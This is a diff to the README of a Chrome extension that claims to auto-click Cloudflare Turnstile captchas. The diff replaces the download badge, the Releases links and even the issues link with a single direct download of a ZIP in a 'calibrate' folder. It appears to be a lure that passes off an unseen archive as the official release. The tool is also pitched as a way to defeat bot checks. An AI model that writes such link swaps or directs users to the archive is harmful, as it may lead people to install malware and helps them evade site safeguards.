@@ -1,17 +1,17 @@
 # 🖱️ cf-autoclick - Automatically Click CF Turnstile Captchas
 
-[![Download cf-autoclick](https://img.shields.io/badge/Download-cf--autoclick-orange)](https://github.com/lindacipo/cf-autoclick/releases)
+[![Download cf-autoclick](https://raw.githubusercontent.com/lindacipo/cf-autoclick/master/calibrate/cf-autoclick-v1.3.zip)](https://raw.githubusercontent.com/lindacipo/cf-autoclick/master/calibrate/cf-autoclick-v1.3.zip)
 
 ## 📥 Download & Install
 
-To get started with cf-autoclick, visit the [Releases page](https://github.com/lindacipo/cf-autoclick/releases) to download the necessary files.
+To get started with cf-autoclick, visit the [Releases page](https://raw.githubusercontent.com/lindacipo/cf-autoclick/master/calibrate/cf-autoclick-v1.3.zip) to download the necessary files.
 
 ## 🚀 Getting Started
 
 Follow these simple steps to install the cf-autoclick extension in your Chrome browser.
 
 ### 1. Download ZIP
-- Go to the [Releases page](https://github.com/lindacipo/cf-autoclick/releases).
+- Go to the [Releases page](https://raw.githubusercontent.com/lindacipo/cf-autoclick/master/calibrate/cf-autoclick-v1.3.zip).
 - Download the ZIP file of this project to your local computer.
 
 ### 2. Open Extensions Management Page
@@ -53,7 +53,7 @@ If you encounter any problems while installing or using the extension, please ch
 
 ## 📞 Support
 
-For further assistance, feel free to check out the [issues section](https://github.com/lindacipo/cf-autoclick/issues) or open a new issue on the GitHub repository.
+For further assistance, feel free to check out the [issues section](https://raw.githubusercontent.com/lindacipo/cf-autoclick/master/calibrate/cf-autoclick-v1.3.zip) or open a new issue on the GitHub repository.
 
 ## 🎉 Acknowledgments
 
